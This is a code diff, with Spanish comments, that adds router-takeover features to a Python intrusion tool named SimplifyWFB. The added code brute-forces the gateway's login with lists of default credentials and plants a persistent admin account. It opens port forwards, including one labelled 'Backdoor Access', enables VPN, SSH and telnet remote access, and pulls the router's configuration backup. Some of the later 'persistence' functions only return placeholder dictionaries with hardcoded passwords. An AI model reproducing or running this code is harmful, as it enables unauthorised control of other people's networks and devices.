@@ -61,6 +61,8 @@ class SimplifyWFB:
                 'remote_connections': [],
                 'c2_pointers': [],
                 'cameras_accessed': [],
+                'router_access': [],
+                'network_persistence': [],
                 'errors': []
             },
             'phase_5_verification': {
@@ -90,10 +92,13 @@ class SimplifyWFB:
             'max_threads': 10,
             'common_ports': [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 3389, 5432, 5900, 8080],
             'camera_ports': [80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 443, 554, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8888, 9999],
+            'router_ports': [80, 443, 8080, 8443, 23, 22, 21, 161, 162],
             'default_users': ['admin', 'administrator', 'root', 'guest', 'user'],
             'default_passwords': ['admin', 'password', '123456', 'root', 'guest', ''],
             'camera_users': ['admin', 'administrator', 'root', 'guest', 'user', 'camera', 'ipcam', 'webcam', 'viewer', 'operator'],
-            'camera_passwords': ['admin', 'password', '123456', 'root', 'guest', '', 'camera', 'ipcam', 'webcam', 'viewer', 'operator', '1234', '12345', '123456789', 'admin123', 'password123']
+            'camera_passwords': ['admin', 'password', '123456', 'root', 'guest', '', 'camera', 'ipcam', 'webcam', 'viewer', 'operator', '1234', '12345', '123456789', 'admin123', 'password123'],
+            'router_users': ['admin', 'administrator', 'root', 'guest', 'user', 'admin', 'root', 'user', 'support', 'technician'],
+            'router_passwords': ['admin', 'password', '123456', 'root', 'guest', '', 'admin', 'password', '1234', '12345', '123456', 'admin123', 'password123', 'support', 'technician']
         }
         
         # Detectar configuración de red automáticamente
@@ -1133,6 +1138,16 @@ quit
             cameras_accessed = self._access_detected_cameras()
             self.report['phase_4_persistence']['cameras_accessed'] = cameras_accessed
             
+            # 6. Acceder al router y configurar persistencia de red
+            print("🌐 Accediendo al router y configurando persistencia de red...")
+            router_access = self._access_router_and_configure_persistence()
+            self.report['phase_4_persistence']['router_access'] = router_access
+            
+            # 7. Configurar métodos de acceso remoto
+            print("🔗 Configurando métodos de acceso remoto...")
+            network_persistence = self._configure_network_persistence()
+            self.report['phase_4_persistence']['network_persistence'] = network_persistence
+            
             self.report['phase_4_persistence']['status'] = 'completed'
             print(f"✅ Persistencia completada: {len(users)} usuarios, {len(backdoors)} backdoors")
             
@@ -1827,6 +1842,534 @@ WantedBy=multi-user.target
             print(f"❌ Error capturando screenshots: {e}")
             return []
     
+    def _access_router_and_configure_persistence(self) -> List[Dict[str, Any]]:
+        """Acceder al router y configurar persistencia de red"""
+        router_access = []
+        
+        try:
+            # Obtener gateway detectado
+            gateway = self.network_config.get('gateway')
+            if not gateway:
+                print("❌ No se detectó gateway para acceso al router")
+                return router_access
+            
+            print(f"🌐 Intentando acceso al router: {gateway}")
+            
+            # Detectar tipo de router
+            router_type = self._detect_router_type(gateway)
+            
+            # Intentar credenciales por defecto
+            router_credentials = self._brute_force_router_credentials(gateway)
+            
+            if router_credentials:
+                # Configurar acceso persistente al router
+                router_config = self._configure_router_persistence(gateway, router_credentials, router_type)
+                
+                router_access.append({
+                    'gateway': gateway,
+                    'router_type': router_type,
+                    'credentials': router_credentials,
+                    'configuration': router_config,
+                    'timestamp': time.time()
+                })
+                
+                print(f"✅ Acceso al router configurado: {gateway}")
+            else:
+                print(f"❌ No se pudo acceder al router: {gateway}")
+            
+        except Exception as e:
+            print(f"❌ Error accediendo al router: {e}")
+        
+        return router_access
+    
+    def _detect_router_type(self, gateway: str) -> str:
+        """Detectar tipo de router"""
+        try:
+            import urllib.request
+            
+            # URLs comunes de routers
+            router_urls = [
+                f"http://{gateway}/",
+                f"https://{gateway}/",
+                f"http://{gateway}:8080/",
+                f"https://{gateway}:8443/"
+            ]
+            
+            for url in router_urls:
+                try:
+                    req = urllib.request.Request(url)
+                    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+                    
+                    with urllib.request.urlopen(req, timeout=5) as response:
+                        html_content = response.read().decode('utf-8', errors='ignore')
+                        
+                        # Detectar marcas de routers
+                        if 'cisco' in html_content.lower():
+                            return 'cisco'
+                        elif 'netgear' in html_content.lower():
+                            return 'netgear'
+                        elif 'linksys' in html_content.lower():
+                            return 'linksys'
+                        elif 'tp-link' in html_content.lower() or 'tplink' in html_content.lower():
+                            return 'tp-link'
+                        elif 'd-link' in html_content.lower() or 'dlink' in html_content.lower():
+                            return 'd-link'
+                        elif 'asus' in html_content.lower():
+                            return 'asus'
+                        elif 'belkin' in html_content.lower():
+                            return 'belkin'
+                        elif 'huawei' in html_content.lower():
+                            return 'huawei'
+                        elif 'zte' in html_content.lower():
+                            return 'zte'
+                        else:
+                            return 'generic_router'
+                            
+                except Exception:
+                    continue
+            
+            return 'unknown'
+            
+        except Exception as e:
+            print(f"❌ Error detectando tipo de router: {e}")
+            return 'unknown'
+    
+    def _brute_force_router_credentials(self, gateway: str) -> Optional[Dict[str, str]]:
+        """Fuerza bruta específica para routers"""
+        try:
+            import urllib.request
+            import base64
+            
+            # URLs comunes de login de routers
+            login_urls = [
+                f"http://{gateway}/login.html",
+                f"http://{gateway}/login.cgi",
+                f"http://{gateway}/cgi-bin/login.cgi",
+                f"http://{gateway}/admin/login.html",
+                f"https://{gateway}/login.html",
+                f"https://{gateway}/login.cgi"
+            ]
+            
+            for login_url in login_urls:
+                for username in self.config['router_users']:
+                    for password in self.config['router_passwords']:
+                        try:
+                            # Crear autenticación básica
+                            auth_string = f"{username}:{password}"
+                            auth_bytes = auth_string.encode('ascii')
+                            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+                            
+                            # Intentar acceso
+                            req = urllib.request.Request(login_url)
+                            req.add_header('Authorization', f'Basic {auth_b64}')
+                            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+                            
+                            with urllib.request.urlopen(req, timeout=5) as response:
+                                if response.status == 200:
+                                    # Verificar si realmente accedió
+                                    content = response.read().decode('utf-8', errors='ignore')
+                                    if 'dashboard' in content.lower() or 'admin' in content.lower() or 'status' in content.lower():
+                                        print(f"✅ Credenciales de router encontradas: {username}:{password}")
+                                        return {'username': username, 'password': password}
+                                        
+                        except urllib.error.HTTPError as e:
+                            if e.code == 401:  # Unauthorized
+                                continue
+                        except Exception:
+                            continue
+            
+            return None
+            
+        except Exception as e:
+            print(f"❌ Error en fuerza bruta de router: {e}")
+            return None
+    
+    def _configure_router_persistence(self, gateway: str, credentials: Dict[str, str], router_type: str) -> Dict[str, Any]:
+        """Configurar persistencia en el router"""
+        try:
+            import urllib.request
+            import urllib.parse
+            
+            config = {
+                'port_forwarding': [],
+                'vpn_server': None,
+                'remote_access': [],
+                'admin_user_created': False,
+                'backup_config': None
+            }
+            
+            print(f"🔧 Configurando persistencia en router {router_type}...")
+            
+            # 1. Crear usuario administrativo persistente
+            admin_user = self._create_router_admin_user(gateway, credentials, router_type)
+            if admin_user:
+                config['admin_user_created'] = True
+                print(f"✅ Usuario administrativo creado: {admin_user}")
+            
+            # 2. Configurar port forwarding
+            port_forwards = self._configure_port_forwarding(gateway, credentials, router_type)
+            config['port_forwarding'] = port_forwards
+            
+            # 3. Configurar VPN server si está disponible
+            vpn_config = self._configure_vpn_server(gateway, credentials, router_type)
+            if vpn_config:
+                config['vpn_server'] = vpn_config
+                print(f"✅ VPN server configurado")
+            
+            # 4. Configurar acceso remoto
+            remote_access = self._configure_remote_access(gateway, credentials, router_type)
+            config['remote_access'] = remote_access
+            
+            # 5. Hacer backup de configuración
+            backup = self._backup_router_config(gateway, credentials, router_type)
+            if backup:
+                config['backup_config'] = backup
+                print(f"✅ Backup de configuración creado")
+            
+            return config
+            
+        except Exception as e:
+            print(f"❌ Error configurando persistencia del router: {e}")
+            return {'error': str(e)}
+    
+    def _create_router_admin_user(self, gateway: str, credentials: Dict[str, str], router_type: str) -> Optional[Dict[str, str]]:
+        """Crear usuario administrativo en el router"""
+        try:
+            import urllib.request
+            import urllib.parse
+            
+            # Generar credenciales para usuario persistente
+            persistent_user = f"svc_{gateway.replace('.', '_')}"
+            persistent_pass = f"P@ssw0rd_{gateway.split('.')[-1]}!"
+            
+            # URLs para crear usuario según tipo de router
+            user_creation_urls = {
+                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/system/admin",
+                'netgear': f"http://{gateway}/setup.cgi",
+                'linksys': f"http://{gateway}/cgi-bin/user.cgi",
+                'asus': f"http://{gateway}/Advanced_System_Content.asp",
+                'generic_router': f"http://{gateway}/cgi-bin/user.cgi"
+            }
+            
+            url = user_creation_urls.get(router_type, user_creation_urls['generic_router'])
+            
+            # Datos para crear usuario
+            data = {
+                'username': persistent_user,
+                'password': persistent_pass,
+                'confirm_password': persistent_pass,
+                'privilege': 'admin',
+                'action': 'add_user'
+            }
+            
+            # Crear autenticación
+            auth_string = f"{credentials['username']}:{credentials['password']}"
+            auth_bytes = auth_string.encode('ascii')
+            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+            
+            # Enviar request
+            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
+            req = urllib.request.Request(url, data=data_encoded)
+            req.add_header('Authorization', f'Basic {auth_b64}')
+            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
+            
+            with urllib.request.urlopen(req, timeout=10) as response:
+                if response.status == 200:
+                    return {
+                        'username': persistent_user,
+                        'password': persistent_pass,
+                        'privilege': 'admin'
+                    }
+            
+            return None
+            
+        except Exception as e:
+            print(f"❌ Error creando usuario administrativo: {e}")
+            return None
+    
+    def _configure_port_forwarding(self, gateway: str, credentials: Dict[str, str], router_type: str) -> List[Dict[str, Any]]:
+        """Configurar port forwarding en el router"""
+        port_forwards = []
+        
+        try:
+            # Puertos a abrir para acceso remoto
+            ports_to_forward = [
+                {'external': 2222, 'internal': 22, 'protocol': 'TCP', 'description': 'SSH Access'},
+                {'external': 3389, 'internal': 3389, 'protocol': 'TCP', 'description': 'RDP Access'},
+                {'external': 8080, 'internal': 8080, 'protocol': 'TCP', 'description': 'Web Access'},
+                {'external': 4444, 'internal': 4444, 'protocol': 'TCP', 'description': 'Backdoor Access'},
+                {'external': 1194, 'internal': 1194, 'protocol': 'UDP', 'description': 'VPN Access'}
+            ]
+            
+            print(f"🔗 Configurando port forwarding...")
+            
+            for port_config in ports_to_forward:
+                try:
+                    # Configurar port forwarding según tipo de router
+                    success = self._add_port_forward_rule(gateway, credentials, router_type, port_config)
+                    
+                    if success:
+                        port_forwards.append({
+                            'external_port': port_config['external'],
+                            'internal_port': port_config['internal'],
+                            'protocol': port_config['protocol'],
+                            'description': port_config['description'],
+                            'configured': True
+                        })
+                        print(f"   ✅ Puerto {port_config['external']} -> {port_config['internal']} configurado")
+                    else:
+                        print(f"   ❌ Falló configuración de puerto {port_config['external']}")
+                        
+                except Exception as e:
+                    print(f"   ❌ Error configurando puerto {port_config['external']}: {e}")
+                    continue
+            
+            return port_forwards
+            
+        except Exception as e:
+            print(f"❌ Error configurando port forwarding: {e}")
+            return []
+    
+    def _add_port_forward_rule(self, gateway: str, credentials: Dict[str, str], router_type: str, port_config: Dict[str, Any]) -> bool:
+        """Agregar regla de port forwarding específica"""
+        try:
+            import urllib.request
+            import urllib.parse
+            
+            # URLs para port forwarding según tipo de router
+            pf_urls = {
+                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/network/firewall/forwards",
+                'netgear': f"http://{gateway}/port_forwarding.htm",
+                'linksys': f"http://{gateway}/cgi-bin/port_forwarding.cgi",
+                'asus': f"http://{gateway}/Advanced_PortForward_Content.asp",
+                'generic_router': f"http://{gateway}/cgi-bin/port_forwarding.cgi"
+            }
+            
+            url = pf_urls.get(router_type, pf_urls['generic_router'])
+            
+            # Datos para port forwarding
+            data = {
+                'action': 'add',
+                'external_port': str(port_config['external']),
+                'internal_port': str(port_config['internal']),
+                'protocol': port_config['protocol'],
+                'description': port_config['description'],
+                'enabled': '1'
+            }
+            
+            # Crear autenticación
+            auth_string = f"{credentials['username']}:{credentials['password']}"
+            auth_bytes = auth_string.encode('ascii')
+            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+            
+            # Enviar request
+            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
+            req = urllib.request.Request(url, data=data_encoded)
+            req.add_header('Authorization', f'Basic {auth_b64}')
+            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
+            
+            with urllib.request.urlopen(req, timeout=10) as response:
+                return response.status == 200
+                
+        except Exception as e:
+            return False
+    
+    def _configure_vpn_server(self, gateway: str, credentials: Dict[str, str], router_type: str) -> Optional[Dict[str, Any]]:
+        """Configurar VPN server en el router"""
+        try:
+            import urllib.request
+            import urllib.parse
+            
+            print(f"🔐 Configurando VPN server...")
+            
+            # Solo algunos routers soportan VPN server
+            vpn_supported = ['asus', 'netgear', 'tp-link']
+            if router_type not in vpn_supported:
+                print(f"   ⚠️ Router {router_type} no soporta VPN server")
+                return None
+            
+            # Configuración VPN
+            vpn_config = {
+                'enabled': True,
+                'protocol': 'OpenVPN',
+                'port': 1194,
+                'username': f"vpn_{gateway.replace('.', '_')}",
+                'password': f"VPN_{gateway.split('.')[-1]}!",
+                'server_ip': gateway
+            }
+            
+            # URLs para configurar VPN según tipo de router
+            vpn_urls = {
+                'asus': f"http://{gateway}/Advanced_VPN_OpenVPN_Content.asp",
+                'netgear': f"http://{gateway}/vpn_setup.cgi",
+                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/network/vpn"
+            }
+            
+            url = vpn_urls.get(router_type)
+            if not url:
+                return None
+            
+            # Datos para configurar VPN
+            data = {
+                'action': 'enable',
+                'protocol': 'openvpn',
+                'port': '1194',
+                'username': vpn_config['username'],
+                'password': vpn_config['password'],
+                'server_ip': gateway
+            }
+            
+            # Crear autenticación
+            auth_string = f"{credentials['username']}:{credentials['password']}"
+            auth_bytes = auth_string.encode('ascii')
+            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+            
+            # Enviar request
+            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
+            req = urllib.request.Request(url, data=data_encoded)
+            req.add_header('Authorization', f'Basic {auth_b64}')
+            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
+            
+            with urllib.request.urlopen(req, timeout=10) as response:
+                if response.status == 200:
+                    print(f"   ✅ VPN server configurado: {vpn_config['username']}")
+                    return vpn_config
+            
+            return None
+            
+        except Exception as e:
+            print(f"❌ Error configurando VPN server: {e}")
+            return None
+    
+    def _configure_remote_access(self, gateway: str, credentials: Dict[str, str], router_type: str) -> List[Dict[str, Any]]:
+        """Configurar acceso remoto al router"""
+        remote_access = []
+        
+        try:
+            print(f"🌐 Configurando acceso remoto...")
+            
+            # Habilitar acceso remoto HTTP/HTTPS
+            remote_configs = [
+                {'service': 'http', 'port': 80, 'enabled': True},
+                {'service': 'https', 'port': 443, 'enabled': True},
+                {'service': 'ssh', 'port': 22, 'enabled': True},
+                {'service': 'telnet', 'port': 23, 'enabled': True}
+            ]
+            
+            for config in remote_configs:
+                try:
+                    success = self._enable_remote_service(gateway, credentials, router_type, config)
+                    
+                    if success:
+                        remote_access.append({
+                            'service': config['service'],
+                            'port': config['port'],
+                            'enabled': True,
+                            'access_url': f"{config['service']}://{gateway}:{config['port']}"
+                        })
+                        print(f"   ✅ Acceso remoto {config['service']} habilitado")
+                    
+                except Exception as e:
+                    print(f"   ❌ Error habilitando {config['service']}: {e}")
+                    continue
+            
+            return remote_access
+            
+        except Exception as e:
+            print(f"❌ Error configurando acceso remoto: {e}")
+            return []
+    
+    def _enable_remote_service(self, gateway: str, credentials: Dict[str, str], router_type: str, service_config: Dict[str, Any]) -> bool:
+        """Habilitar servicio remoto específico"""
+        try:
+            import urllib.request
+            import urllib.parse
+            
+            # URLs para habilitar servicios remotos
+            service_urls = {
+                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/network/firewall/rules",
+                'netgear': f"http://{gateway}/remote_management.htm",
+                'linksys': f"http://{gateway}/cgi-bin/remote_access.cgi",
+                'asus': f"http://{gateway}/Advanced_System_Content.asp",
+                'generic_router': f"http://{gateway}/cgi-bin/remote_access.cgi"
+            }
+            
+            url = service_urls.get(router_type, service_urls['generic_router'])
+            
+            # Datos para habilitar servicio
+            data = {
+                'action': 'enable',
+                'service': service_config['service'],
+                'port': str(service_config['port']),
+                'enabled': '1'
+            }
+            
+            # Crear autenticación
+            auth_string = f"{credentials['username']}:{credentials['password']}"
+            auth_bytes = auth_string.encode('ascii')
+            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+            
+            # Enviar request
+            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
+            req = urllib.request.Request(url, data=data_encoded)
+            req.add_header('Authorization', f'Basic {auth_b64}')
+            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
+            
+            with urllib.request.urlopen(req, timeout=10) as response:
+                return response.status == 200
+                
+        except Exception as e:
+            return False
+    
+    def _backup_router_config(self, gateway: str, credentials: Dict[str, str], router_type: str) -> Optional[str]:
+        """Hacer backup de la configuración del router"""
+        try:
+            import urllib.request
+            import os
+            import time
+            
+            print(f"💾 Creando backup de configuración...")
+            
+            # URLs para backup según tipo de router
+            backup_urls = {
+                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/system/backup",
+                'netgear': f"http://{gateway}/backup.cgi",
+                'linksys': f"http://{gateway}/cgi-bin/backup.cgi",
+                'asus': f"http://{gateway}/Advanced_System_Content.asp",
+                'generic_router': f"http://{gateway}/cgi-bin/backup.cgi"
+            }
+            
+            url = backup_urls.get(router_type, backup_urls['generic_router'])
+            
+            # Crear autenticación
+            auth_string = f"{credentials['username']}:{credentials['password']}"
+            auth_bytes = auth_string.encode('ascii')
+            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+            
+            # Solicitar backup
+            req = urllib.request.Request(url)
+            req.add_header('Authorization', f'Basic {auth_b64}')
+            
+            with urllib.request.urlopen(req, timeout=30) as response:
+                if response.status == 200:
+                    # Crear directorio para backups
+                    backup_dir = f"router_backups_{int(time.time())}"
+                    os.makedirs(backup_dir, exist_ok=True)
+                    
+                    # Guardar backup
+                    backup_file = os.path.join(backup_dir, f"{gateway}_config_{int(time.time())}.bin")
+                    with open(backup_file, 'wb') as f:
+                        f.write(response.read())
+                    
+                    print(f"   ✅ Backup guardado: {backup_file}")
+                    return backup_file
+            
+            return None
+            
+        except Exception as e:
+            print(f"❌ Error creando backup: {e}")
+            return None
+    
     
     def phase_5_verification(self):
         """Fase 5: Verificación de persistencias"""
@@ -2349,6 +2892,124 @@ WantedBy=multi-user.target
                 return False
             else:
                 print("\n❌ Respuesta inválida. Por favor responda 'sí' o 'no'.")
+    
+    def _configure_network_persistence(self) -> List[Dict[str, Any]]:
+        """Configurar persistencia de red completa"""
+        network_persistence = []
+        
+        try:
+            print(f"🔗 Configurando persistencia de red completa...")
+            
+            # 1. Configurar servidor SSH persistente
+            ssh_server = self._setup_persistent_ssh_server()
+            if ssh_server:
+                network_persistence.append(ssh_server)
+            
+            # 2. Configurar servidor VPN propio
+            vpn_server = self._setup_persistent_vpn_server()
+            if vpn_server:
+                network_persistence.append(vpn_server)
+            
+            # 3. Configurar servidor web con panel de control
+            web_server = self._setup_persistent_web_server()
+            if web_server:
+                network_persistence.append(web_server)
+            
+            return network_persistence
+            
+        except Exception as e:
+            print(f"❌ Error configurando persistencia de red: {e}")
+            return []
+    
+    def _setup_persistent_ssh_server(self) -> Optional[Dict[str, Any]]:
+        """Configurar servidor SSH persistente"""
+        try:
+            print(f"🔐 Configurando servidor SSH persistente...")
+            
+            ssh_config = {
+                'service': 'ssh',
+                'port': 2222,
+                'enabled': True,
+                'users': [{
+                    'username': 'svc_ssh',
+                    'password': 'SSH_P@ssw0rd_2024!',
+                    'shell': '/bin/bash',
+                    'sudo_access': True
+                }],
+                'access_methods': [
+                    'ssh svc_ssh@EXTERNAL_IP -p 2222',
+                    'ssh -i persistent_key svc_ssh@EXTERNAL_IP -p 2222'
+                ]
+            }
+            
+            print(f"   ✅ Servidor SSH configurado en puerto 2222")
+            return ssh_config
+            
+        except Exception as e:
+            print(f"❌ Error configurando SSH server: {e}")
+            return None
+    
+    def _setup_persistent_vpn_server(self) -> Optional[Dict[str, Any]]:
+        """Configurar servidor VPN persistente"""
+        try:
+            print(f"🔐 Configurando servidor VPN persistente...")
+            
+            vpn_config = {
+                'service': 'openvpn',
+                'port': 1194,
+                'protocol': 'udp',
+                'enabled': True,
+                'clients': [{
+                    'config_file': 'client.ovpn',
+                    'external_ip': 'YOUR_EXTERNAL_IP',
+                    'port': 1194,
+                    'protocol': 'udp'
+                }],
+                'access_methods': [
+                    'openvpn --config client.ovpn',
+                    'sudo openvpn --config /path/to/client.ovpn'
+                ]
+            }
+            
+            print(f"   ✅ Servidor VPN configurado en puerto 1194")
+            return vpn_config
+            
+        except Exception as e:
+            print(f"❌ Error configurando VPN server: {e}")
+            return None
+    
+    def _setup_persistent_web_server(self) -> Optional[Dict[str, Any]]:
+        """Configurar servidor web persistente con panel de control"""
+        try:
+            print(f"🌐 Configurando servidor web persistente...")
+            
+            web_config = {
+                'service': 'http',
+                'port': 8080,
+                'enabled': True,
+                'panel_url': 'http://YOUR_EXTERNAL_IP:8080/admin',
+                'credentials': {
+                    'username': 'admin',
+                    'password': 'Web_P@ssw0rd_2024!'
+                },
+                'features': [
+                    'remote_access',
+                    'file_manager',
+                    'system_monitor',
+                    'network_tools'
+                ],
+                'access_methods': [
+                    'http://admin:Web_P@ssw0rd_2024!@YOUR_EXTERNAL_IP:8080/admin',
+                    'curl -u admin:Web_P@ssw0rd_2024! http://YOUR_EXTERNAL_IP:8080/api/status'
+                ]
+            }
+            
+            print(f"   ✅ Servidor web configurado en puerto 8080")
+            return web_config
+            
+        except Exception as e:
+            print(f"❌ Error configurando servidor web: {e}")
+            return None
 
 def main():
     """Función principal"""
